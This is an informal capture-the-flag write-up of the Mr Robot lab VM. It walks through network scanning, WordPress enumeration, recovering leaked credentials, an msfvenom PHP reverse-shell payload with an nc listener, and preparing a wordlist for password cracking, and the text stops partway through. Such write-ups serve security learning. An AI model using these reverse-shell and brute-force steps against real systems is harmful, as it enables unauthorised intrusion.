mr robot write up

i start by running ifconfig on host machine to know the network its running on
i then run netdiscover on the vbox1 network where i discover 2 ports open

```
 sudo netdiscover -r 192.168.57.0/24 -i vboxnet1
```

running a simple scan from nmap we acertain 192.168.57.5 is our target ip

we then fully enumerate our ip on nmap 

```
nmap -sSVC -Pn -O -A -on mrrobot.txt 192.168.57.5
```

after our nmap scan we discover the following ports

PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
443/tcp open   ssl/http Apache httpd

as port 80 is open we can access it via the web.

seems like a site with command inputs. 

i run a gobuster scan to reveal any hidden directories and routes.

in our enumeration we discover the site is a wordpress site also

running wpscan we discover the following intersting finds

	.Apache web server
	.Mod_Pagespeed 1.9.32.3-4523,Old version (2015). Has known bugs; could be exploited if exposed to internet.
	.robots.txt
	.XML-RPC Enabled. this allows : Allows brute-force login attacks (wordpress_xmlrpc_login).
					Used in DDoS amplification (wordpress_xmlrpc_dos).
					Enables pingback reflection attacks.
	.WP-Cron Exposed
	.WordPress Core Version -> WordPress version 4.3.1 identified (Insecure, released on 2015-09-15).
	Theme: twentyfifteen [+] WordPress theme in use: twentyfifteen
			       | Version: 1.3 (80% confidence)
			       | [!] The version is out of date, the latest version is 4.0
			       
from here we try to enumerate the wordpress core without any success. 

from the gobuster i discover a /robots.txt routes which i decided to visit. i find a route < key-1-of-3.txt with the key = 073403c8a58a1f80d943455fb30724b9>

this secures our first key of 3

we also discover a license file. upon visiting we find a base64 key. when we decrypt the base64 ke we get a user and name {elliot:ER28-0652}

we use the name and password to login 

with access to the dashboard i create a shell.php to create a backdoor and set up a listenter

```
msfvenom -p php/reverse_php LHOST=192.168.57.1 LPORT=4444 -f raw > shell.php

nc -lnvp 4444

```

from our robots.txt we had gotten a fsocity.dic which is a dictionary password file. as wordpress offers different errors we can easily crack a password and user

first we download the file

```
wget http://192.168.57.5/fsocity.dic
head -5 fsocity.dic  # Preview: you'll see passwords like "qwerty", "fsociety", etc.
wc -l fsocity.dic   # ~858,160 lines — big, so dedupe it first

```

with the list so big we first clean it by removing duplicates

```
sort fsocity.dic | uniq > fsocity-clean.dic
wc -l fsocity-clean.dic  # Smaller now
```
